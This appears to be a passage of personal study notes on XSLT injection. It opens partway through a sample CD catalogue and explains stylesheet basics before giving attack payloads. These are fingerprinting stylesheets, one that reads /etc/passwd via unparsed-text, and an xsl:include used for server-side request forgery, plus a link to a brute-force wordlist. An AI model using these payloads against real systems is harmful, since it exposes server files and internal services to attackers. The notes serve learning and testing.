    <country>USA</country>
    <company>Grammy</company>
    <price>10.20</price>
    <year>1999</year>
  </cd>
  <cd>
    <title>For the good times</title>
    <artist>Kenny Rogers</artist>
    <country>UK</country>
    <company>Mucik Master</company>
    <price>8.70</price>
    <year>1995</year>
  </cd>
  <cd>
    <title>Big Willie style</title>
    <artist>Will Smith</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>9.90</price>
    <year>1997</year>
  </cd>
  <cd>
    <title>Tupelo Honey</title>
    <artist>Van Morrison</artist>
    <country>UK</country>
    <company>Polydor</company>
    <price>8.20</price>
    <year>1971</year>
  </cd>
  <cd>
    <title>Soulsville</title>
    <artist>Jorn Hoel</artist>
    <country>Norway</country>
    <company>WEA</company>
    <price>7.90</price>
    <year>1996</year>
  </cd>
  <cd>
    <title>The very best of</title>
    <artist>Cat Stevens</artist>
    <country>UK</country>
    <company>Island</company>
    <price>8.90</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Stop</title>
    <artist>Sam Brown</artist>
    <country>UK</country>
    <company>A and M</company>
    <price>8.90</price>
    <year>1988</year>
  </cd>
  <cd>
    <title>Bridge of Spies</title>
    <artist>T`Pau</artist>
    <country>UK</country>
    <company>Siren</company>
    <price>7.90</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Private Dancer</title>
    <artist>Tina Turner</artist>
    <country>UK</country>
    <company>Capitol</company>
    <price>8.90</price>
    <year>1983</year>
  </cd>
  <cd>
    <title>Midt om natten</title>
    <artist>Kim Larsen</artist>
    <country>EU</country>
    <company>Medley</company>
    <price>7.80</price>
    <year>1983</year>
  </cd>
  <cd>
    <title>Pavarotti Gala Concert</title>
    <artist>Luciano Pavarotti</artist>
    <country>UK</country>
    <company>DECCA</company>
    <price>9.90</price>
    <year>1991</year>
  </cd>
  <cd>
    <title>The dock of the bay</title>
    <artist>Otis Redding</artist>
    <country>USA</country>
    <company>Stax Records</company>
    <price>7.90</price>
    <year>1968</year>
  </cd>
  <cd>
    <title>Picture book</title>
    <artist>Simply Red</artist>
    <country>EU</country>
    <company>Elektra</company>
    <price>7.20</price>
    <year>1985</year>
  </cd>
  <cd>
    <title>Red</title>
    <artist>The Communards</artist>
    <country>UK</country>
    <company>London</company>
    <price>7.80</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Unchain my heart</title>
    <artist>Joe Cocker</artist>
    <country>USA</country>
    <company>EMI</company>
    <price>8.20</price>
    <year>1987</year>
  </cd>
</catalog>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
    <h2>My CD Collection</h2>
    <table border="1">
      <tr bgcolor="#9acd32">
        <th>Title</th>
        <th>Artist</th>
      </tr>
      <tr>
        <td><xsl:value-of select="catalog/cd/title"/></td>
        <td><xsl:value-of select="catalog/cd/artist"/></td>
      </tr>
    </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet>
```

first we need to understand the XSLT format to see how the transformation happens: 
- first line is usually XML version and encoding 
- XSL root node `xsl:stylesheet`
- directives in `xsl:template match="<PATH>"`, will apply to any xml node in this case 
- transformation is defined for any item in the XML structure matching the previous line
- XPATH language is used in the form `<xsl:value-of select="<NODE>/<SUBNODE>/<VALUE>"/>` to select certain items from the XML document 

can run transformations in the console: 

```shell
saxonb-xslt -xsl:transformation.xsl catalogue.xml
```

![](Images/Pasted%20image%2020240214202045.png)

then we can do the same with the detection file to detect the underlying preprocessor: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html"/>
<xsl:template match="/">
    <h2>XSLT identification</h2>
    <b>Version:</b> <xsl:value-of select="system-property('xsl:version')"/><br/>
    <b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')" /><br/>
    <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
</xsl:template>
</xsl:stylesheet>
```

![](Images/Pasted%20image%2020240214202221.png)

then based on the findings we can look at the version documentation to look for functions of interest like `unparsed-text` which can be used to read local files

again create a new file to use this: 

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```

then use the same command to transform: 

![](Images/Pasted%20image%2020240214202408.png)

`xsl:include` can be used to perform SSRF: 

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:5000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```

![](Images/Pasted%20image%2020240214202546.png)

below are some more advanced tech stack identification: 

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:product-version')">
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:is-schema-aware')">
 Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-serialization')">
 Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
 Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
 </xsl:if>
</xsl:template>
</xsl:stylesheet>
```

this is also a wordlist for brute-forcing functionality: https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt

